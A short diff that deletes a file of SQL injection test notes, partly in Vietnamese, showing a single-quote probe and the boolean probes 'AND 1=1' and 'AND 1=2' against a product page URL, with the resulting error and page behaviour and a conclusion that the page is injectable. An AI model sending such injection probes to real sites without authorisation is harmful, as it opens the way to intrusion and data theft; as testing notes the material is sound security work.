@@ -1,9 +1,0 @@
-Test 1: https://shop.com/product.php?id=8'
-→ Error: You have an error in your SQL syntax near ''' 
-
-Test 2: https://shop.com/product.php?id=8 AND 1=1
-→ Hiển thị sản phẩm bình thường
-
-Test 3: https://shop.com/product.php?id=8 AND 1=2
-→ Không hiển thị gì (blank page)
-✅ Kết luận: Có SQL Injection
